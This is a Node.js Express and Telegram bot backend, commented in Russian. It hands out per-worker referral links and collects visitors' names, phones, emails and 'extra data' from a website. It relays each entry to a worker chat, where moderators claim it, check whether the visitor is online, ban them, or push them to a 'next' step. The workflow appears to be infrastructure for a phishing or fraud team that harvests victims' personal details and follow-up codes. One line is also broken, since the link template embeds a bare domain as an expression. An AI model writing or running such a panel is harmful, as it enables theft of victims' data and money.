const express = require("express");
const TelegramBot = require("node-telegram-bot-api");

const app = express();

// ===== АНТИКРАШ =====
process.on("unhandledRejection", (err) => {
  console.log("❌ UNHANDLED:", err?.message);
});
process.on("uncaughtException", (err) => {
  console.log("❌ CRASH:", err?.message);
});

app.use(express.json({ limit: "1mb" }));
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

// ===== БОТ =====
const bot = new TelegramBot(process.env.WORKER_BOT_TOKEN, {
  polling: true
});

const enterBot = new TelegramBot(process.env.ENTER_BOT_TOKEN);

// ===== ENV =====
const adminId = Number(process.env.ADMIN_CHAT_ID);
const workerChat = Number(process.env.WORKER_CHAT_ID);
const SITE_URL = process.env.SITE_URL;

// ===== SAFE =====
async function safeSend(chatId, text, opts = {}) {
  try { return await bot.sendMessage(chatId, text, opts); }
  catch (e) { console.log("send error:", e?.message); }
}

async function safeEdit(chatId, msgId, text, opts = {}) {
  try {
    return await bot.editMessageText(text, {
      chat_id: chatId,
      message_id: msgId,
      ...opts
    });
  } catch (e) { console.log("edit error:", e?.message); }
}

async function safeDelete(chatId, msgId) {
  try { await bot.deleteMessage(chatId, msgId); }
  catch {}
}

// ===== БАЗЫ =====
let moderators = [];
let usersByUsername = {};
let userRefs = {};

let takenRequests = {};
let fullRequests = {};
let shortRequests = {};
let groupMessages = {};
let fullMessages = {};

let seenUsers = {};
let onlineUsers = {};
let bannedUsers = {};
let userStatus = {};
let extraSentUsers = {};

// ===== ONLINE =====
function isOnline(id) {
  return onlineUsers[id] && Date.now() - onlineUsers[id] < 20000;
}

// ===== /START =====
bot.onText(/\/start/, (msg) => {
  const username = msg.from.username;
  const id = msg.chat.id;

  if (!username) {
    return safeSend(id, "❌ Поставь username в Telegram");
  }

  usersByUsername[username.toLowerCase()] = id;

  const link = `${banednahui-production.up.railway.app}?ref=${username}`;

  safeSend(id,
`✅ Ты зарегистрирован

🔗 Твоя ссылка:
${link}`);
});

// ===== ПРОВЕРКА МОДЕРА =====
function isMod(id) {
  return id === adminId || moderators.includes(id);
}

// ===== ДОБАВИТЬ МОДЕРА =====
bot.onText(/\/addmod @(.+)/, (msg, match) => {
  if (msg.chat.id !== adminId) return;

  const username = match[1].toLowerCase();
  const id = usersByUsername[username];

  if (!id) {
    return safeSend(adminId, "❌ Он не писал /start");
  }

  if (!moderators.includes(id)) {
    moderators.push(id);
  }

  safeSend(adminId, `✅ Добавлен: @${username}`);
});

// ===== УДАЛИТЬ =====
bot.onText(/\/delmod @(.+)/, (msg, match) => {
  if (msg.chat.id !== adminId) return;

  const username = match[1].toLowerCase();
  const id = usersByUsername[username];

  moderators = moderators.filter(m => m !== id);

  safeSend(adminId, `❌ Удалён: @${username}`);
});

// ===== ВХОД =====
app.post("/enter", async (req, res) => {
  const { clientId, ref } = req.body;

  if (!clientId) return res.json({ ok: false });

  onlineUsers[clientId] = Date.now();

  if (ref) userRefs[clientId] = ref;

  res.json({ ok: true });
});

// ===== ПИНГ =====
app.post("/ping", (req, res) => {
  const id = req.body.clientId;
  if (id) onlineUsers[id] = Date.now();
  res.json({ ok: true });
});

// ===== ЗАЯВКА =====
app.post("/send", async (req, res) => {
  const d = req.body;
  const id = d.clientId;

  if (!id) return res.json({ ok: false });
  if (bannedUsers[id]) return res.json({ ok: false });

  delete takenRequests[id];
  delete extraSentUsers[id];

  const isRepeat = seenUsers[id];
  seenUsers[id] = true;

  const status = isRepeat ? "🔁 ПОВТОРНАЯ" : "🆕 НОВАЯ";

  const refText = userRefs[id]
    ? `👤 Привёл: @${userRefs[id]}`
    : "👤 Привёл: неизвестно";

  const full = `${status}

🆔 ${id}
📦 ${d.service}
👤 ${d.name}
📞 ${d.phone}
📅 ${d.email}
${d.city}
${d.comment}

${refText}`;

  const short = `${status}

📦 ${d.service}
👤 ${d.name}
📞 ${d.phone}

${refText}`;

  fullRequests[id] = full;
  shortRequests[id] = short;

  const msg = await safeSend(workerChat, short, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "📥 Забрать", callback_data: "take_" + id }]
      ]
    }
  });

  if (msg) groupMessages[id] = msg.message_id;

  userStatus[id] = "wait";

  res.json({ ok: true, id });
});

// ===== СТАТУС =====
app.get("/status/:id", (req, res) => {
  res.json({ status: userStatus[req.params.id] || "wait" });
});

// ===== ДОП =====
app.post("/send2", async (req, res) => {
  const { id, value } = req.body;

  if (!id || !value) return res.json({ ok: false });
  if (extraSentUsers[id]) return res.json({ ok: false });

  extraSentUsers[id] = true;

  const owner = takenRequests[id];

  if (owner) {
    await safeSend(owner, `📩 ДОП ДАННЫЕ\n🆔 ${id}\n💬 ${value}`);
  }

  res.json({ ok: true });
});

// ===== CALLBACK =====
bot.on("callback_query", async (q) => {
  const data = q.data;
  const id = data.split("_")[1];

  if (!isMod(q.from.id)) {
    return bot.answerCallbackQuery(q.id, { text: "❌ Нет доступа" });
  }

  // ===== ЗАБРАТЬ =====
  if (data.startsWith("take")) {

    if (takenRequests[id]) {
      return bot.answerCallbackQuery(q.id, { text: "❌ Уже занято" });
    }

    takenRequests[id] = q.from.id;

    const username = q.from.username
      ? "@" + q.from.username
      : q.from.first_name;

    const sent = await safeSend(q.from.id, fullRequests[id], {
      reply_markup: {
        inline_keyboard: [
          [{ text: "🟢 Онлайн?", callback_data: "check_" + id }],
          [
            { text: "🚫 Бан", callback_data: "ban_" + id },
            { text: "✅ Разбан", callback_data: "unban_" + id }
          ],
          [{ text: "➡️ ДАЛЬШЕ", callback_data: "allow_" + id }]
        ]
      }
    });

    if (sent) fullMessages[id] = sent.message_id;

    await safeEdit(workerChat, groupMessages[id],
`${shortRequests[id]}

👤 Взял: ${username}`, {
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔓 Освободить", callback_data: "free_" + id }]
        ]
      }
    });

    bot.answerCallbackQuery(q.id);
  }

  // ===== ОСВОБОДИТЬ =====
  if (data.startsWith("free")) {
    delete takenRequests[id];

    await safeDelete(q.from.id, fullMessages[id]);

    await safeEdit(workerChat, groupMessages[id],
      shortRequests[id], {
      reply_markup: {
        inline_keyboard: [
          [{ text: "📥 Забрать", callback_data: "take_" + id }]
        ]
      }
    });

    bot.answerCallbackQuery(q.id);
  }

  // ===== ОНЛАЙН =====
  if (data.startsWith("check")) {
    bot.answerCallbackQuery(q.id, {
      text: isOnline(id) ? "🟢 Онлайн" : "🔴 Оффлайн"
    });
  }

  // ===== БАН =====
  if (data.startsWith("ban")) {
    bannedUsers[id] = true;
    bot.answerCallbackQuery(q.id);
  }

  // ===== РАЗБАН =====
  if (data.startsWith("unban")) {
    delete bannedUsers[id];
    bot.answerCallbackQuery(q.id);
  }

  // ===== ДАЛЬШЕ =====
  if (data.startsWith("allow")) {
    userStatus[id] = "next";
    bot.answerCallbackQuery(q.id, { text: "➡️ Переведён" });
  }
});

app.listen(process.env.PORT || 3000, () => {
  console.log("SERVER OK");
});
